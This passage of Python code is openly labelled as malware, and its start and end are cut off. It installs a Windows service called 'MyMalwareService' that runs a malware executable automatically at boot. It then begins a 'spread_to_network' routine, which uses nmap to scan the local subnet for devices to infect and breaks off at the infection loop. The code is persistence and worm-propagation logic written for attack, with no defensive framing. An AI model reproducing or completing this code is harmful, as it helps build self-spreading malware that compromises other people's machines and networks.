        try:
            subprocess.run(["sc", "create", "MyMalwareService", "binPath= \\\\.\\C:\\path\\to\\malware.exe", "start= auto"], check=True)
            subprocess.run(["sc", "start", "MyMalwareService"], check=True)
            print("Service installed and started successfully.")
        except subprocess.CalledProcessError as e:
            print(f"Error installing service: {e}")
    else:
        print("Service installation is only supported on Windows.")

def spread_to_network():
    """Scans the network for vulnerable devices and attempts to infect them."""
    try:
        # Use nmap or similar tools to scan the network
        # (Requires nmap to be installed)
        result = subprocess.run(["nmap", "-sn", "192.168.1.0/24"], capture_output=True, text=True, check=True)
        hosts = result.stdout.splitlines()

        for host in hosts:
